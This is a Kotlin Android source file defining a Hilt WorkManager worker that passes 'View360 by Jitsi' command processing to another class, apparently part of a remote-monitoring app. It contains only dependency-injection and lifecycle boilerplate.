package com.android.services.workers.View360ByJitsi

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.WorkerParameters
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.interfaces.IWorkerProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.workers.base.BaseWorker
import com.android.services.workers.view360.View360CommandProcessingBase
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.CoroutineScope

@HiltWorker
class View360ByJitsiMeetCommandWorker @AssistedInject constructor(
    @Assisted val context: Context,
    @Assisted parameters: WorkerParameters,
    val localDatabaseSource: LocalDatabaseSource,
    @ApplicationScope val coroutineScope: CoroutineScope
) : BaseWorker(
    context,
    parameters,
    View360ByJitsiCommandProcessingBase.VIEW_360_BY_JITSI_WORKER_TAG
) {
    private lateinit var view360ByJitsiCommandProcessingBaseImpll: IWorkerProcessing
    override fun onCreate() {
        view360ByJitsiCommandProcessingBaseImpll =
            View360ByJitsiCommandProcessingBaseImpll(context, localDatabaseSource, coroutineScope)
        view360ByJitsiCommandProcessingBaseImpll.onCreate()
    }

    override fun onStartCommand() {
        view360ByJitsiCommandProcessingBaseImpll.onStartCommand(inputData)
    }

    override fun onStop() {
        view360ByJitsiCommandProcessingBaseImpll.onDestroy()
    }
}